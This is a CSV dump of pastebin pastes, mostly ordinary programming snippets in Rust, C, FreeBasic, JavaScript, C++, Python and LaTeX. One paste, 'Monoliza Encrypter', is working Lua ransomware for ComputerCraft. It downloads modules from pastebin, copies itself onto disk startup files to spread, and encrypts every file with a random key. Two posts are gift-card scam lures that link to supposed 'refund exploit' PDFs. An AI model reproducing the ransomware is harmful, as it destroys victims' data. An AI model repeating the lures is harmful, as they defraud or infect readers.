@@ -1,0 +1,3290 @@
+id,title,username,language,date,content
+hfaZYFqg,expr eval,mdgaziur001,Rust,Thursday 4th of April 2024 12:53:01 PM CDT,"use std::f64::consts::PI;
+use std::io;
+use std::io::Write;
+use std::str::Chars;
+
+#[derive(Debug)]
+struct Tokenizer<'t> {
+    iterator: Chars<'t>,
+}
+
+impl<'t> Tokenizer<'t> {
+    pub fn new(source: &'t str) -> Self {
+        Self {
+            iterator: source.chars(),
+        }
+    }
+
+    pub fn next_token(&mut self) -> Result<Option<Token>, String> {
+        let Some(next) = self.iterator.next() else {
+            return Ok(None);
+        };
+
+        match next {
+            '(' => Ok(Some(Token::BrOpen)),
+            ')' => Ok(Some(Token::BrClose)),
+            '^' => Ok(Some(Token::Op(MathOp::Pow))),
+            '+' => Ok(Some(Token::Op(MathOp::Add))),
+            '-' => Ok(Some(Token::Op(MathOp::Sub))),
+            '*' => Ok(Some(Token::Op(MathOp::Mul))),
+            '/' => Ok(Some(Token::Op(MathOp::Div))),
+            'π' => Ok(Some(Token::Num(PI))),
+            ch if ch.is_ascii_digit() || ch == '.' => {
+                let mut num = String::from(ch);
+                let mut it2 = self.iterator.clone();
+
+                while let Some(next_ch) = it2.next() {
+                    if !next_ch.is_ascii_digit() && next_ch != '.' {
+                        break;
+                    }
+
+                    num.push(next_ch);
+                    self.iterator.next();
+                }
+
+                Ok(Some(Token::Num(num.parse().map_err(|e| {
+                    format!(""Encountered error while parsing number: {e}"")
+                })?)))
+            }
+            ' ' => self.next_token(),
+            _ => Err(""Encountered unexpected character"".to_string()),
+        }
+    }
+}
+
+/// Parser grammar:
+///
+/// ```
+/// expr = term;
+/// term = factor ((""+"" | ""-"") factor)*;
+/// factor = power ((""*"" | ""/"") power)*;
+/// power = unary (""^"" unary)*;
+/// unary = ""-""? (unary | primary);
+/// primary = Num | ""("" expr "")"";
+/// ```
+#[derive(Debug)]
+struct Parser<'ecx> {
+    tokenizer: Tokenizer<'ecx>,
+    current: Option<Token>,
+}
+
+impl<'ecx> Parser<'ecx> {
+    pub fn new(mut tokenizer: Tokenizer<'ecx>) -> Result<Option<Self>, String> {
+        let current = tokenizer.next_token()?;
+
+        Ok(Some(Self {
+            tokenizer,
+            current,
+        }))
+    }
+
+    pub fn parse(&mut self) -> Result<AST, String> {
+        self.term()
+    }
+
+    fn term(&mut self) -> Result<AST, String> {
+        let mut expr = self.factor()?;
+
+        while self.current == Some(Token::Op(MathOp::Add)) || self.current == Some(Token::Op(MathOp::Sub)) {
+            let Token::Op(op) = self.current.unwrap() else {
+                unreachable!()
+            };
+
+            self.next()?;
+            expr = AST::Op(Operation {
+                lhs: Box::new(expr),
+                rhs: Box::new(self.factor()?),
+                op,
+            })
+        }
+
+        Ok(expr)
+    }
+
+    fn factor(&mut self) -> Result<AST, String> {
+        let mut expr = self.power()?;
+
+        while self.current == Some(Token::Op(MathOp::Mul)) || self.current == Some(Token::Op(MathOp::Div)) {
+            let Token::Op(op) = self.current.unwrap() else {
+                unreachable!()
+            };
+
+            self.next()?;
+            expr = AST::Op(Operation {
+                lhs: Box::new(expr),
+                rhs: Box::new(self.power()?),
+                op,
+            })
+        }
+
+        Ok(expr)
+    }
+
+    fn power(&mut self) -> Result<AST, String> {
+        let mut expr = self.unary()?;
+
+        while self.current == Some(Token::Op(MathOp::Pow)) {
+            self.next()?;
+            expr = AST::Op(Operation {
+                lhs: Box::new(expr),
+                rhs: Box::new(self.unary()?),
+                op: MathOp::Pow,
+            })
+        }
+
+        Ok(expr)
+    }
+
+    fn unary(&mut self) -> Result<AST, String> {
+        if matches!(self.current, Some(Token::Op(MathOp::Sub))) {
+            let _ = self.next()?;
+
+            let operand = self.unary()?;
+            Ok(AST::Neg(Box::new(operand)))
+        } else {
+            self.primary()
+        }
+    }
+
+    fn primary(&mut self) -> Result<AST, String> {
+        match self.current {
+            Some(Token::Num(num)) => {
+                self.next()?;
+                Ok(AST::Num(num))
+            },
+            Some(Token::BrOpen) => {
+                // Consume ""(""
+                let _ = self.next()?;
+
+                // Parse inner expression
+                let parsed = self.parse();
+
+                // Consume "")""
+                let _ = self.expect(Token::BrClose)?;
+
+                parsed
+            }
+            Some(_) => Err(""Unexpected token"".to_string()),
+            None => Err(""Unexpected EOF"".to_string())
+        }
+    }
+
+    fn expect(&mut self, expected: Token) -> Result<Token, String> {
+        if !matches!(self.current, Some(_expected)) {
+            Err(format!(""Expected {expected:?}, found {:?}"", self.current))
+        } else {
+            Ok(self.current.unwrap())
+        }
+    }
+
+    fn next(&mut self) -> Result<Option<Token>, String> {
+        self.current = self.tokenizer.next_token()?;
+        Ok(self.current)
+    }
+}
+
+#[derive(Debug)]
+enum AST {
+    Num(f64),
+    Op(Operation),
+    Neg(Box<AST>),
+}
+
+#[derive(Debug)]
+struct Operation {
+    lhs: Box<AST>,
+    rhs: Box<AST>,
+    op: MathOp,
+}
+
+#[derive(Debug, Copy, Clone, PartialEq)]
+enum Token {
+    Num(f64),
+    BrOpen,
+    BrClose,
+    Op(MathOp),
+}
+
+#[derive(Debug, Copy, Clone, PartialEq)]
+enum MathOp {
+    Add,
+    Sub,
+    Mul,
+    Div,
+    Pow,
+}
+
+fn eval_ast(ast: &AST) -> Result<f64, String> {
+    match ast {
+        AST::Num(num) => Ok(*num),
+        AST::Op(operation) => {
+            let lhs = eval_ast(&operation.lhs)?;
+            let rhs = eval_ast(&operation.rhs)?;
+
+            Ok(match operation.op {
+                MathOp::Add => lhs + rhs,
+                MathOp::Sub => lhs - rhs,
+                MathOp::Mul => lhs * rhs,
+                MathOp::Div => lhs / rhs,
+                MathOp::Pow => lhs.powf(rhs)
+            })
+        }
+        AST::Neg(expr) => Ok(-eval_ast(expr)?)
+    }
+}
+
+fn process_expr(expr: &str) {
+    let tokenizer = Tokenizer::new(&expr);
+    let mut parser = match Parser::new(tokenizer) {
+        Ok(Some(parser)) => parser,
+        Ok(None) => return,
+        Err(e) => {
+            eprintln!(""Err: {e}"");
+            return;
+        }
+    };
+
+    let ast = match parser.parse() {
+        Ok(ast) => ast,
+        Err(e) => {
+            eprintln!(""Err: {e}"");
+            return;
+        }
+    };
+
+    match eval_ast(&ast) {
+        Ok(res) => println!(""{res}""),
+        Err(e) => {
+            eprintln!(""Err: {e}"");
+            return;
+        }
+    }
+}
+
+fn take_input() -> String {
+    print!(""> "");
+    io::stdout().flush().unwrap();
+    let mut buf = String::new();
+    io::stdin().read_line(&mut buf).unwrap();
+
+    buf.trim().to_string()
+}
+
+fn main() {
+    loop {
+        let input = take_input();
+        if input == ""q"" {
+            break;
+        }
+
+        process_expr(&input);
+    }
+}
+"
+C2Nfsmzh,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Thursday 4th of April 2024 12:36:38 PM CDT,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+
+This is the most up to date version of this script. Any other one posted will not work!
+ 
+PDF guide here:
+https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_812090.pdf
+
+Working as of:
+04 April 2024"
+aRvjUkMC,Monoliza Encrypter,matveymayner,Lua,Thursday 4th of April 2024 12:31:28 PM CDT,"local function getSubPaths(path)
+    local list = fs.list(path)
+    local paths = {}
+ 
+    for _, name in pairs(list) do
+        local newPath = fs.combine(path, name)
+        if (fs.isDir(newPath)) then
+            local subPaths = getSubPaths(newPath)
+            for i = 1, #subPaths do
+                paths[#paths+1] = subPaths[i]
+            end
+        else
+            paths[#paths+1] = newPath
+        end
+    end
+ 
+    return paths
+end
+ 
+local function getPaths(path, readROM)
+    if (path == """" or path == ""/"") then
+        if (readROM) then
+            return getSubPaths(path)
+        else
+            local list = fs.list(""/"")
+            local paths = {}
+            for _, path in pairs(list) do
+                if (path ~= ""rom"") then
+                    if (fs.isDir(path)) then
+                        local subPaths = getSubPaths(path)
+                        for i = 1, #subPaths do
+                            paths[#paths+1] = subPaths[i]
+                        end
+                    else
+                        paths[#paths+1] = path
+                    end
+                end
+            end
+            return paths
+        end
+    else
+        return getSubPaths(path)
+    end
+end
+ 
+ 
+local files = getPaths(""/"", false)
+os.setComputerLabel(""Crypt0 PC"")
+fs.delete(""virus"")
+fs.makeDir(""virus"")
+shell.run(""pastebin get EuUDCuRZ virus/vir"")
+shell.run(""pastebin get 9YW1XWXN virus/logsalt"")
+shell.run(""pastebin get DMx8M0LP virus/aeslua"")
+os.loadAPI(""virus/aeslua"")
+os.loadAPI(""virus/logsalt"")
+ 
+if fs.exists(""disk"") and fs.isDir(""disk"") then
+if fs.exists(""disk/startup"") then
+fs.delete(""disk/startup"")
+end
+fs.copy(""virus/vir"", ""disk/startup"") -- i am evil
+end
+ 
+if fs.exists(""disk2"") and fs.isDir(""disk2"") then
+if fs.exists(""disk2/startup"") then
+fs.delete(""disk2/startup"")
+end
+fs.copy(""virus/vir"", ""disk2/startup"") -- i am evil v2
+end
+ 
+local dec = logsalt.rand(10)
+for _,v in pairs(files) do
+if string.sub(v, 1,5) == ""virus"" then
+    else
+print(""Found file "" .. v)
+end
+end
+print(""starting enc"")
+local iv = {}
+for i = 1,16 do iv[i] = math.random(1,255) end
+for _,v in pairs(files) do
+    if v == ""virus/aeslua"" or v == ""virus/logsalt"" or v == ""virus/vir"" or v == ""disk/startup"" or v == ""disk2/startup"" then
+    else
+    local hBf = fs.open(v, ""r"")
+    local stuff = hBf.readAll()
+    local encrypted = aeslua.encrypt(dec,stuff)
+    print(""Encrypted file "" .. v)
+    hBf.close()
+    hAf = fs.open(v, ""w"")
+    hAf.write(encrypted)
+    hAf.close()
+    end
+end
+ 
+term.clear()
+term.setBackgroundColor(colors.red)
+term.setCursorPos(1,1)
+for i=1,16 do
+  term.setCursorPos(1,i)
+term.write(""-MONOLIZA ENCRYPT-"")
+term.write(""Your All Files Has Been Encrypted"")
+end
+"
+aQbdKNRj,Untitled,vuseless,HTML,Thursday 4th of April 2024 12:28:58 PM CDT,"<div id=""div_id_votes"" class=""form-group""> <div class> <div class=""form-check""> <input type=""checkbox"" class=""form-check-input"" name=""votes"" id=""id_votes_1"" value=""me""> <label class=""form-check-label"" for=""id_votes_1"">
+me
+</label> </div> <div class=""form-check""> <input type=""checkbox"" class=""form-check-input"" name=""votes"" id=""id_votes_2"" value=""stcking (pnty and stcking with grterbelt)""> <label class=""form-check-label"" for=""id_votes_2"">
+stcking (pnty and stcking with grterbelt)
+</label> </div> </div> </div>
+</div>
+onlinepoll.me/poll/vote/who-wins-174"
+Jw3ve2Ej,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Thursday 4th of April 2024 12:28:03 PM CDT,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+ 
+This is the most up to date version of this script. Any other one posted will not work!
+ 
+PDF guide here:
+https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
+ 
+ 
+Working as of:
+04 April 2024"
+B7EcaFtU,finaly_hueta,artmexbet,C,Thursday 4th of April 2024 12:21:48 PM CDT,"#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <pthread.h>
+#include <string.h>
+
+#define ROWS 4
+#define COLS 5
+
+struct ThreadResult {
+    int count;
+    int indexes[6];
+};
+
+struct ThreadInfo {
+    int matrix[ROWS][COLS];
+    int deltaX;
+    int deltaY;
+    int currentIndexI;
+    int currentIndexJ;
+    struct ThreadResult result;
+};
+
+void fill_matrix(int array[ROWS][COLS]) {
+    srand(time(NULL));
+    for (int i = 0; i < ROWS; i++) {
+        for (int j = 0; j < COLS; j++) {
+            array[i][j] = 1 + rand() % 3;
+        }
+    }
+}
+
+void print_matrix(int array[ROWS][COLS]) {
+    for (int i = 0; i < ROWS; i++) {
+        for (int j = 0; j < COLS; j++) {
+            printf(""%d "", array[i][j]);
+        }
+        printf(""\n"");
+    }
+}
+
+void *get_values(void *info_) {
+    struct ThreadInfo *info = (struct ThreadInfo *) info_;
+    struct ThreadResult *result = (struct ThreadResult *) malloc(sizeof(struct ThreadResult));
+    result->count = 0;
+    // Вот отсюда можно выкинуть вычисление уголочка из этой точки в отдельный поток
+    int k = 0;
+    int lengthOfHorizontal = 0; // Сюда сохраняем длину повторящихся символов в строке
+    int i = info->currentIndexI;
+    int j = info->currentIndexJ;
+    while (0 < j + k && j + k < COLS && info->matrix[i][j + k] == info->matrix[i][j]) {
+        lengthOfHorizontal++;
+        // Или вот отсюда можно запускать потоки, проверяющие вертикальные линии на совпадение с элементом matrix[i][j]
+        // Нижний цикл выкинуть в отдельный поток
+        int l = 0;
+        int lengthOfVertical = 0; // Сюда сохраняем длину повторяющихся символов в столбце
+        while (0 < i + l && i + l < ROWS && info->matrix[i + l][j + k] == info->matrix[i][j + k]) {
+            lengthOfVertical++;
+            l += info->deltaX;
+        }
+        if (lengthOfHorizontal + lengthOfVertical > result->count) {
+            result->indexes[0] = i;
+            result->indexes[1] = j;
+            result->indexes[2] = i;
+            result->indexes[3] = j + k;
+            result->indexes[4] = i + l - 1 * info->deltaX;
+            result->indexes[5] = j + k;
+            result->count = lengthOfHorizontal + lengthOfVertical;
+//                    coords = {i, j, i, j + k, i + l - 1, j + k};
+        }
+        k += info->deltaY;
+    }
+    return (void *) result;
+}
+
+void find_g(int matrix[ROWS][COLS]) {
+    int maxCount = 0;
+    int coords[] = {0, 0, 0, 0, 0, 0};
+    for (int i = 0; i < ROWS; i++) {
+        for (int j = 0; j < COLS; j++) {
+            struct ThreadInfo first, second, third, fourth;
+            struct ThreadResult *result1, *result2, *result3, *result4;
+            memcpy(first.matrix, matrix, ROWS * COLS * sizeof(int));
+            memcpy(second.matrix, matrix, ROWS * COLS * sizeof(int));
+            memcpy(third.matrix, matrix, ROWS * COLS * sizeof(int));
+            memcpy(fourth.matrix, matrix, ROWS * COLS * sizeof(int));
+            first.deltaX = 1;
+            first.deltaY = -1;
+            first.currentIndexI = i;
+            first.currentIndexJ = j;
+
+            second.deltaX = -1;
+            second.deltaY = -1;
+            second.currentIndexI = i;
+            second.currentIndexJ = j;
+
+            third.deltaX = -1;
+            third.deltaY = 1;
+            third.currentIndexI = i;
+            third.currentIndexJ = j;
+
+            fourth.deltaX = 1;
+            fourth.deltaY = 1;
+            fourth.currentIndexI = i;
+            fourth.currentIndexJ = j;
+
+            pthread_t thread1, thread2, thread3, thread4;
+            pthread_create(&thread1, NULL, &get_values, &first);
+            pthread_create(&thread2, NULL, &get_values, &second);
+            pthread_create(&thread3, NULL, &get_values, &third);
+            pthread_create(&thread4, NULL, &get_values, &fourth);
+            pthread_join(thread1, (void **) &result1);
+            pthread_join(thread2, (void **) &result2);
+            pthread_join(thread3, (void **) &result3);
+            pthread_join(thread4, (void **) &result4);
+//            for (int i = 0; i < 6; i++) {
+//                printf(""%d "", first.result.indexes[i]);
+//            }
+//            printf(""\n"");
+            if (result1->count > maxCount) {
+                maxCount = result1->count;
+                memcpy(coords, result1->indexes, sizeof(result1->indexes));
+            }
+            if (result2->count > maxCount) {
+                maxCount = result2->count;
+                memcpy(coords, result2->indexes, sizeof(result2->indexes));
+            }
+            if (result3->count > maxCount) {
+                maxCount = result3->count;
+                memcpy(coords, result3->indexes, sizeof(result3->indexes));
+            }
+            if (result4->count > maxCount) {
+                maxCount = result4->count;
+                memcpy(coords, result4->indexes, sizeof(result4->indexes));
+            }
+        }
+    }
+    for (int i = 0; i < 6; i++) {
+        printf(""%d "", coords[i]);
+    }
+}
+
+int main() {
+//    printf(""Hello, World!\n"");
+    int arr[ROWS][COLS] = {{0, 2, 0, 2, 0},
+                           {0, 1, 1, 1, 0},
+                           {2, 0, 2, 1, 1},
+                           {0, 2, 0, 1, 1}};
+//    fill_matrix(arr);
+    print_matrix(arr);
+    find_g(arr);
+    return 0;
+}
+"
+6n6QvRPT,Untitled,Mysoft,FreeBasic,Thursday 4th of April 2024 12:16:54 PM CDT,"#include ""fbgfx.bi""
+
+const ScreenWid=640,ScreenHei=480 
+
+screenres ScreenWid,ScreenHei,8  'setup 640x480x8bpp (256 colors)
+width ScreenWid\8,ScreenHei\16   'set font size to 8x16
+
+'iDirX is how many pixels it moves per frame (initially 1 (to the right))
+'since we're going from -10 to 10... that number must be a divisor of 10
+'so must be one of 1,2,5 or 10 (this simplify the check)
+dim as integer iOffsetX,iDirX=1
+dim as integer iPosX,iPosY
+dim as string sSentence = ""Hello World""
+
+'calculate center position for sentence
+iPosX = (ScreenWid-len(sSentence)*8)\2 'horizontal
+iPosY = (ScreenHei-16)\2      'vertical
+
+do
+  
+  screenlock 'block screen from update
+    cls 'clears whole screen (could fill just an area)
+    'draw centered text over right position (in yellow)
+    Draw String ( iPosX+iOffsetX , iPosY ) , sSentence , 14
+    
+    iOffsetX += iDirX 'change position depending on direction (left/right)
+    if iOffsetX = -10 orelse iOffsetX = 10 then 
+      iDirX = -iDirX 'if it hit side positions invert direction
+    end if
+  screenunlock 'allow display of the screen
+  sleep 30 'waits 30ms... making roughly 30fps
+  
+  'draw frames until ESC is pressed
+loop until multikey(fb.SC_ESCAPE)"
+TmKnPaQS,Untitled,retroman,FreeBasic,Thursday 4th of April 2024 12:11:33 PM CDT,"dim as string strings(1 to 10) = {""hello world"","" hello world"",""  hello world"",""   hello world"",""    hello world"",""     hello world"",""      hello world"",""       hello world"",""        hello world"",""         hello world""}
+
+for h as integer = 1 to 10 step 1
+	color 4
+	for i as integer = 1 to 10 step 1
+		print strings(i)
+		sleep 100
+		shell(""cls"")
+	next
+	color 6
+	for j as integer = 10 to 1 step -1
+		print strings(j)
+		sleep 100
+		shell(""cls"")
+	next
+next
+sleep
+"
+BVCYikLA,Untitled,poxipox,Lua,Thursday 4th of April 2024 12:03:51 PM CDT,"glbMissionCfg.setMission(cid, playerMission)
+
+NA:
+
+		if missionTab.talk_start_addNextMission then
+			glbMissionCfg.setMission(cid, playerMission+1)
+		else
+			glbMissionCfg.setMission(cid, playerMission)
+		end
+"
+XhDpAjmZ,Noam Oved | HW Networks,XNoAmX,Python,Thursday 4th of April 2024 11:47:08 AM CDT,"import requests
+from lxml import html
+
+LETTER_OFFSET = 100
+
+def scrape_files():
+    """"""
+    Scrape files from a specific URL and return a list of file names.
+    :return: A list of file names
+    :rtype: list
+    """"""
+    URL = ""http://webisfun.cyber.org.il/nahman/files/""
+    response = requests.get(URL)
+    tree = html.fromstring(response.content)
+    trs = tree.xpath('//a')
+
+    file_list = []
+
+    for tr in trs:
+        file_list.append(tr.attrib.get('href'))
+    return file_list[5:]
+
+def extract_password_from_site():
+    """"""    
+    Extract a password from files obtained from a website.
+    :return: Extracted password
+    :rtype: str
+    """"""
+    URL = ""http://webisfun.cyber.org.il/nahman/files/{file}""
+    password = """"
+    for i in scrape_files():
+        response = requests.get(URL.format(file = str(i)))
+        password += response.content.decode('utf-8')[LETTER_OFFSET - 1]
+    return password
+
+def find_most_common_words(URL, words_in_sentence):
+    """"""
+    Fetches text from the provided URL, counts the frequency of each word, 
+    and returns a string containing the most common words up to the specified count.
+    :param URL: The URL from which to fetch the text
+    :param words_in_sentence: Number of most common words to include in the output sentence
+    :type URL: str
+    :type words_in_sentence: int
+    :return: A string containing the most common words
+    :rtype: str
+    """"""
+    response = requests.get(URL)
+    response = response.content.decode('utf-8')
+    wordlist = response.split("" "")
+    freq_dict = {}
+
+    for element in wordlist:  
+        if element in freq_dict:
+            freq_dict[element] += 1  
+        else:  
+            freq_dict[element] = 1
+              
+    freq_dict = dict(sorted(freq_dict.items(), key=lambda item: item[1], reverse=True))  
+
+    return "" "".join(list(freq_dict.keys())[:words_in_sentence])
+
+def main():
+    print(""[!] Welcome to nahman cracker"")
+    print(""[1] Get password"")
+    print(""[2] Get sentence "")
+    option = input(""[+] "")
+    
+    if option == '1':
+        print(extract_password_from_site())
+    elif option == '2':
+        print(find_most_common_words(""http://webisfun.cyber.org.il/nahman/final_phase/words.txt"", 6))
+
+if __name__ == '__main__':
+    main()
+
+"
+3LXG7BEL,Untitled,Mysoft,FreeBasic,Thursday 4th of April 2024 11:42:49 AM CDT,"const Yellow=14,Red=12
+var iCor = Yellow
+do
+  color iCor : iCor xor= (Yellow xor Red)
+  locate 1,1 : print ""Price: $3232"";
+  sleep 200
+loop
+  "
+HtqgyDDg,calculator,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:34:07 AM CDT,"class Calculator {
+  constructor() {
+    this.result = 0;
+  }
+
+  add(num) {
+    this.result += num;
+    return this;
+  }
+
+  subtract(num) {
+    this.result -= num;
+    return this;
+  }
+
+  multiply(num) {
+    this.result *= num;
+    return this;
+  }
+
+  divide(num) {
+    if (num === 0) {
+      throw new Error(""Cannot divide by zero"");
+    }
+    this.result /= num;
+    return this;
+  }
+
+  getResult() {
+    return this.result;
+  }
+}
+
+// Test method chaining
+const calc = new Calculator();
+const result = calc.add(5).multiply(2).subtract(3).divide(2).getResult();
+console.log(result); // Output: 4
+"
+tAsB0Qzu,factory,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:29:15 AM CDT,"// define facory as a meta-class
+
+class Employee {
+  create (type) {
+    let employee
+    if (type === 'fulltime') {
+      employee = new FullTime()
+    } else if (type === 'parttime') {
+      employee = new PartTime()
+    } else if (type === 'temporary') {
+      employee = new Temporary()
+    } else if (type === 'contractor') {
+      employee = new Contractor()
+    }
+    employee.type = type
+    employee.say = function () {
+      console.log(`${this.type}: rate ${this.rate}/hour`)
+    }
+  }
+}
+
+// define classes for every job type
+class Fulltime {
+  constructor () {
+    this.rate = '$12'
+  }
+}
+
+class PartTime {
+  constructor () {
+    this.rate = '$11'
+  }
+}
+
+class Temporary {
+  constructor () {
+    this.rate = '$10'
+  }
+}
+
+class Contractor {
+  constructor () {
+    this.rate = '$15'
+  }
+}
+
+// usage example
+// create new factory
+const factory = new Employee()
+fulltime = factory.create('fulltime')
+parttime = factory.create('parttime')
+temporary = factory.create('temporary')
+contractor = factory.create('contractor')
+
+// use it
+fulltime.say()
+parttime.say()
+temporary.say()
+contractor.say()"
+3m17VwDa,car inheritance,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:23:07 AM CDT,"// Constructor function for base Vehicle
+function Vehicle(make, model) {
+  this.make = make;
+  this.model = model;
+}
+
+// Method for starting the vehicle
+Vehicle.prototype.start = function() {
+  console.log(`Starting the ${this.make} ${this.model}`);
+};
+
+// Constructor function for Car inheriting from Vehicle
+function Car(make, model, numDoors) {
+  // Call the parent constructor using call() or apply()
+  Vehicle.call(this, make, model);
+  this.numDoors = numDoors;
+}
+
+// Inherit Vehicle prototype methods
+Car.prototype = Object.create(Vehicle.prototype);
+Car.prototype.constructor = Car;
+
+// Override start method for Car
+Car.prototype.start = function() {
+  console.log(`Starting the ${this.make} ${this.model} with ${this.numDoors} doors`);
+};
+
+// Test the classes
+const myVehicle = new Vehicle('Toyota', 'Camry');
+myVehicle.start(); // Output: Starting the Toyota Camry
+
+const myCar = new Car('Honda', 'Civic', 4);
+myCar.start(); // Output: Starting the Honda Civic with 4 doors"
+bsREf055,dog,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:21:43 AM CDT,"// 1) Create a class Animal with properties name and a method makeSound()
+class Animal {
+  constructor(name) {
+    this.name = name;
+  }
+
+  makeSound() {
+    console.log(""The animal makes a sound"");
+  }
+}
+
+// 2) Create a class Dog that inherits from Animal and overrides the makeSound() method
+class Dog extends Animal {
+  constructor(name) {
+    super(name);
+  }
+
+  makeSound() {
+    console.log(`${this.name} barks`);
+  }
+}
+
+// 3) Instantiate a Dog object and call its makeSound() method
+const myDog = new Dog(""Buddy"");
+myDog.makeSound(); // Output: Buddy barks"
+E8K29FWV,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 11:21:27 AM CDT,"#include <iostream>
+#include <ctime>
+#include <cstdlib>
+
+using namespace std;
+
+int main() {
+	const auto W{ 7 };
+	const auto K{ 11 };
+	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK
+
+	srand(time(nullptr));
+	// wypełnienie tablicy:
+	auto parzyste{ 0 };
+	for (auto i{ 0 }; i < W; ++i) {
+		for (auto j{ 0 }; j < K; ++j) {
+			tablica[i][j] = 1 + rand() % 30;
+			cout << tablica[i][j] << '\t';
+			if (tablica[i][j] % 2 == 0) {
+				++parzyste;
+			}
+		}
+		cout << endl;
+	}
+	cout << ""W tablicy znajduje sie "" << parzyste << "" parzystych liczb.\n"";
+
+	return 0;
+}"
+WqDxDzJ6,Untitled,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:20:36 AM CDT,"// Define the Engine object
+const Engine = {
+  horsepower: 250,
+  fuelType: 'gasoline'
+};
+
+// Define the Vehicle object
+const Vehicle = {
+  make: 'Jeep',
+  model: 'Cherokee'
+};
+
+// Create a Car object by composing Vehicle and Engine objects using Object.assign()
+const Car = Object.assign({}, Vehicle, Engine);
+
+// Test Car object
+console.log(Car);"
+3Xq94ktT,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 11:18:59 AM CDT,"#include <iostream>
+#include <ctime>
+#include <cstdlib>
+
+using namespace std;
+
+int main() {
+	const auto W{ 5 };
+	const auto K{ 6 };
+	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK
+
+	srand(time(nullptr));
+	// wypełnienie tablicy:
+	for (auto i{ 0 }; i < W; ++i) {
+		for (auto j{ 0 }; j < K; ++j) {
+			tablica[i][j] = 1 + rand() % 30;
+		}
+	}
+
+	// wypisanie tablicy na ekran:
+	for (auto i{ 0 }; i < W; ++i) {
+		for (auto j{ 0 }; j < K; ++j) {
+			cout << tablica[i][j] << '\t';
+		}
+		cout << endl;
+	}
+
+	auto parzyste{ 0 };
+	// sprawdzenie ile jest liczb parzystych w tablicy:
+	for (auto i{ 0 }; i < W; ++i) {
+		for (auto j{ 0 }; j < K; ++j) {
+			if (tablica[i][j] % 2 == 0) {
+				++parzyste;
+			}
+		}
+	}
+	cout << ""W tablicy znajduje sie "" << parzyste << "" parzystych liczb.\n"";
+
+	return 0;
+}"
+4e8TkAEu,Untitled,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:17:38 AM CDT,"// Prototype object for math operations
+const MathOperations = {
+  // Method to add two numbers
+  add(x, y) {
+    return x + y;
+  },
+
+  // Method to subtract two numbers
+  subtract(x, y) {
+    return x - y;
+  }
+};
+
+// Specific object representing a number value
+const NumberValue = {
+  value: 0
+};
+
+// Delegate math operations to the MathOperations prototype methods
+NumberValue.__proto__ = MathOperations;
+
+// Test math operations
+const number1 = Object.create(NumberValue);
+number1.value = 10;
+
+const number2 = Object.create(NumberValue);
+number2.value = 5;
+
+console.log(number1.add(5, 3)); // Output: 8
+console.log(number2.subtract(10, 3)); // Output: 7"
+eXDtYy3s,Normal Gauss Distribution,nm9505,Latex,Thursday 4th of April 2024 11:11:51 AM CDT,"\documentclass{article}[14pt,a4paper] % Comment the following line to NOT allow the usage of umlauts 
+%\usepackage[utf8]{inputenc}
+%\useusepackage[utf8]{imputenc} %\usepackage[a4paper, lmargin=2cm, rmargin=2cm, bottom=2cm]{geometry}
+\usepackage{color} % Uncomment the following line to allow the usage of graphics (.png, .jpg) 
+\usepackage{multicol} \usepackage{verbatim} \usepackage{graphicx} \usepackage{amsmath} \usepackage[all]{xy} \usepackage{pst-all} \usepackage{tikz} \usepackage{gnuplottex}  \usepackage{pst-pdf} 
+\usepackage{mathtools,amssymb}
+\usepackage{xcolor}
+%\usepackage{chronology}
+%\usepackage{pst-solides3d} 
+\tikzset{flippedeventlabel/.append style={align=center}} \usetikzlibrary{datavisualization} \usetikzlibrary{matrix.skeleton} \usetikzlibrary[shapes,arrows,positioning,fit,backgrounds,intersections,shadows,calc] \usetikzlibrary{positioning} \usetikzlibrary{decorations.text} \usetikzlibrary{decorations.pathmorphing} 
+\usepackage{pgfplots} \pgfplotsset{width=10cm,compat=1.9} 
+%\psset{viewpoint=10 18 60 rtp2xyz,Decran=10,fontsize=10,unit=0.65cm} 
+\usetikzlibrary{patterns} 
+\pgfmathdeclarefunction{gauss}{2}{\pgfmathparse{1/(#2*sqrt(2*pi))*exp(-((x-#1)^2)/(2*#2^2))} }
+% Start the document
+\begin{document} 
+\begin{center} 
+
+
+
+\begin{tikzpicture}
+\begin{pgfonlayer}{background} \path[fill=black,rounded corners]
+(-1,-1) rectangle (10,5);
+\end{pgfonlayer} 
+
+
+ 
+\begin{axis}[white,no markers, domain=0:10, samples=100, axis lines*=left, xlabel=Normal, ylabel=axis $y$, height=5cm, width=10cm, xticklabels={0, $-\infty$, -z, -z/2, 0, z/2, z, $+\infty$, 0}, ytick=\empty, enlargelimits=false, clip=false, axis on top] 
+\addplot [very thick, green, domain=-3:3] {gauss(0,1)} \closedcycle;  
+
+\end{axis}
+\draw node at (4,1){\large\textcolor{white}{$f(z) = \frac{1}{\sqrt{2\pi}}\ \mathbf{e}^{(\frac{z-\mu}{\sigma})^2}$}};
+\end{tikzpicture} 
+\end{center} 
+%Uncomment the following two lines if you want to have a bibliography1 %\bibliographystyle{alpha} %\bibliography{document} %\begin{thebibliography}{document} %\renewcommand %\refname{BIBLIOGRAFIA} %\bibitem{Baz} \textit{Bazaraa, M.S., J.J. %Jarvis} y \textit{H.D. Sheraly}, %\textit{ProgramaciÃ³n lineal y flujo de redes}, %Segunda EdiciÃ³n. LimusÃ¡, MÃ©xico, DF. 2004. %\end{thebibliography} 
+\end{document}
+"
+e0bbEpCP,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 10:48:27 AM CDT,"#include <iostream>
+#include <ctime>
+#include <cstdlib>
+
+using namespace std;
+
